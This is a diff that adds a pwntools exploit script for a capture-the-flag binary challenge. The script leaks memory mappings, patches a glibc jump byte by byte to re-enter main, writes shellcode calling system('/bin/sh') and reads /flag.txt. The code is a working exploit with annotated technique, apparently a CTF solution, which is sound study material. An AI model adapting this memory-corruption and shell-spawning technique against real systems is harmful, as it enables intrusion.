@@ -1,0 +1,196 @@
+#!/usr/bin/env -S python3 -u
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template --host localhost --port 1337
+from pwn import *
+import re
+
+# Set up pwntools for the correct architecture
+context.update(arch='amd64')
+# Just set TERM_PROGRAM in your ~/.profile!
+# context.update(terminal='CHANGEME')
+exe = context.binary = ELF(args.EXE or 'challenge')
+libc = ELF("libc.so.6")
+host = args.HOST or 'localhost'
+port = int(args.PORT or 1337)
+
+# Find flag by exact match or format
+# log.success(find_flag(io.recvall()))
+real_flag = open("./flag.txt", "r").readline().strip()
+fake_flag = open("./flag-fake.txt", "r").readline().strip()
+def find_flag(output):
+    if not isinstance(output, str):
+        output = output.decode(errors="ignore")
+    # Match real flag
+    if real_flag in output:
+        return real_flag
+    # Match fake flag
+    if fake_flag in output:
+        return fake_flag
+    # Match possible local flag
+    with open("/flag.txt", "r") as local:
+        locl_flag = local.readline().strip()
+        if locl_flag in output:
+            return locl_flag
+    # Match regexp flag
+    r = find_flag_fmt(output)
+    if r is not None:
+        return r
+    # Definitely no flag found
+    return None
+
+
+# Find flag by format
+# log.success(find_flag_fmt(io.recvall()))
+ffmt = re.compile(r"gctf{.*}")
+def find_flag_fmt(output):
+    if not isinstance(output, str):
+        output = output.decode(errors="ignore")
+    m = ffmt.search(output)
+    if m is None:
+        return None
+    return m.group(0)
+
+def start_local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def start_remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+def get_mapping_for(io: tube, lib: str):
+    leak = io.recvuntil(lib.encode()).decode()
+    leak = leak.rsplit("\n", maxsplit=1)[1]
+    return int(leak.split("-", maxsplit=1)[0], 16)
+
+def write_byte(io: tube, addr: int, data: int):
+    assert data >= 0 and data <= 255
+    io.sendlineafter(b"What address do you desire for your", hex(addr).encode())
+    io.sendlineafter(b"And what byte do you wish here?\n", hex(data).encode())
+
+def check_reentry(io: tube):
+    assert io.recvuntil(b"I'm a genie in an ELF", timeout=3) != b""
+
+io = start()
+
+# We are presented with the mapping and a stack "leak". Parse it
+exe.address = get_mapping_for(io, "/app/challenge")
+info(f"challenge base: {exe.address = :x}")
+libc.address = get_mapping_for(io, "libc.so.6")
+info(f"libc base: {libc.address = :x}")
+
+io.recvuntil(b"My card deck stacks ")
+stack_leak = int(io.recvuntil(b" "), 16)
+info(f"Got stack address: {stack_leak = :x}")
+
+# Now, we can finally do the writing!
+
+# 1. Reentry
+# To reenter main, we want to call main or _start.
+# Luckily for us, both are readily available on the stack!
+# The strategy is to change a jmp/call displacement so that we
+# can add enough to the RSP and just RET to it.
+# Problem is: _start is so far away, that we need to add 0x1xx, and there are
+# not a lot of opportunities for that here
+# Tip: `objdump -mi386:x86-64:intel -d libc.so.6 | less` and then `/add    rsp,0x1[0-9][0-9]`
+#
+# We target _IO_unbuffer_all which is called as a IO finalizer on exit
+# but _after_ the flushing
+# In particular, the NULL check in line 780: https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/genops.c#L780
+# 9696e:       0f 85 0c ff ff ff       jne    96880 <_IO_cleanup+0xb0>
+# This jump displacement is perfect to set up so that we can jump to 0x87480 instead by writing 0x0b into 96971.
+# Thus we land in the middle of _IO_proc_open.
+# This is not directly on add rsp/ret, but close enough.
+# It does a check on r13 (which luckily has a pointer and sets the jump),
+# zeros the return value, checks the stack canary (which luckily matches with _IO_unbuffer_all's canary offset)
+# adds/pops/rets.
+# Instead of only 0x108, we want to add 0x88 more to reach _start
+info("Setting up first reentry...")
+IO_UNBUFFER_ALL_OFFSET = 0x96971
+IO_PROC_OPEN_ADD_RSP_OFFSET = 0x87459
+
+write_byte(io, libc.address + IO_PROC_OPEN_ADD_RSP_OFFSET, 0x90)
+write_byte(io, libc.address + IO_UNBUFFER_ALL_OFFSET, 0x0b)
+check_reentry(io)
+
+# 2. Stabilizing reentry
+# Now that we reentered, we have to stabilize it.
+# We've consumed the only _start on the stack, but due to
+# _start `call`ing into _libc_start_main, there is a return
+# address on the stack - but it is on a different offset and
+# unfortunately points _after_ the main call to a `hlt`.
+# -> use the next two writes to change the add rsp offset to the return address
+#    and to fix the return address so that it is at the start again.
+info("Stabilizing reentry...")
+STACK_RETURN_ADDR = stack_leak + (0x7fffffffc528 - 0x7fffffffc3f0)
+
+write_byte(io, libc.address + IO_PROC_OPEN_ADD_RSP_OFFSET, 0xb8)
+write_byte(io, STACK_RETURN_ADDR, 0x80)
+check_reentry(io)
+
+# 3. WRITING
+# Now we can finally write our shellcode into the process
+# However, as we always have to fix the return address, only one byte can be
+# written
+# The stack return address also decrements by 0x10 every reentry.
+info("Injecting shell shellcode...")
+code = asm(f"""
+    mov rdi, {next(libc.search(b"/bin/sh"))}
+    mov rax, {libc.symbols["system"]}
+    call rax
+""")
+info(hexdump(code))
+CHALL_START_RET_ADDR = exe.symbols["_start"] + 0x25
+
+for i in range(len(code)):
+    info(f" - {i} / {len(code)}")
+    STACK_RETURN_ADDR -= 0x10
+
+    write_byte(io, CHALL_START_RET_ADDR + i, code[i])
+    write_byte(io, STACK_RETURN_ADDR, 0x80)
+    check_reentry(io)
+
+
+# Now, we just have to go let the program pass "normally"
+# It will return to the shellcode and give us a shell
+# As address 0x0 is invalid, we cannot seek here.
+# There are no checks, so its a fine no-op
+info("Entering shell...")
+write_byte(io, 0, 0)
+write_byte(io, 0, 0)
+
+sleep(0.2)
+io.sendline(b"cat /flag.txt && exit")
+
+f = find_flag(io.recvall())
+if f is not None:
+    log.success(f)
+    exit(0)
+else:
+    # Remember to return nonzero if something failed
+    exit(1)
+
+#io.interactive()
